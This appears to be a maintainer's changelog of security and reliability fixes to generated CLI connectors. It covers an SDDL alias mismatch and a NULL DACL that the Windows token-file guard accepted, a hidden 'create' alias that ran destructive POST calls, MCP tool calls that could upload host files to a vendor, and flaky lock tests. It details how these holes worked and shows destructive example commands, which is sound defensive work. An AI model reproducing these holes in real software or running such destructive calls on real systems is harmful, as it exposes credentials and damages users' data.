handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: The generator's hidden Cobra alias `create` is removed from the 2 commands listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs them
handfixes.why: cli-printing-press gives a POST endpoint command the hidden alias `create`. On these commands the POST is destructive, so an agent that guessed the conventional verb (`<group> create`) ran the destructive call, and the alias appeared nowhere in help, agent-context or governance.md. Reproduced on origin/main 6416a241b against a local fake server: `maxio-cli subscriptions purge-json create sub_123 --ack 1` sent POST /subscriptions/sub_123/purge.json, `sentinelone-cli reports create` sent POST /reports/delete-reports and `tactical-rmm-cli agents shutdown create agent-42` sent POST /agents/agent-42/shutdown/. Fleet gate: tools/maintainer/check_command_tree.py, which walks the real cli.RootCmd() tree (137 such commands in 28 connectors on 6416a241b, 0 after). The canonical command names are unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate fails while the alias is present. Commands here: agents reset (POST /w/company/reset_agents); patching patch-now (POST /w/company/patch_now).
handfixes.spec_encode_followup: Press-side: emit the `create` alias only for operations that create something.

handfixes.summary: An MCP tool call can no longer name a file or directory on the MCP host: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor
handfixes.why: The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.
handfixes.spec_encode_followup: Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.

handfixes.summary: The two derive-lock tests (ContendedAppendIsDerivedBeforeReturn, CaughtUpPassDoesNotWait) wait on what the pass is doing, read from goroutine stacks, instead of fixed 200 ms, 500 ms and 5 s windows; every remaining wait is bounded by the test binary's own deadline
handfixes.why: On windows(fortinet) in CI (2026-10-22, PR #421) the contended test failed with 'contended pass did not finish after the peer released the lock': after release the pass opens a fresh SQLite store and commits, and a slow Windows runner took longer than the fixed 5 s. The 200 ms 'did not return while held' window was also weak: on a slow runner it could elapse before the pass even reached the wait. The contended test now waits until the pass is provably blocked in cliutil.WithFileLock called from DeriveFlagCorrections (it cannot return before release), so it is stronger, not weaker. Proven: a pass that returns early under contention fails it; a caught-up pass that polls or blocks fails the caught-up test; with a simulated 6 s store open after the lock, the old test fails with the CI message and the new one passes.
handfixes.spec_encode_followup: Press-side: the generated internal/learn derive_test.go should use this state-based wait in place of the fixed windows.
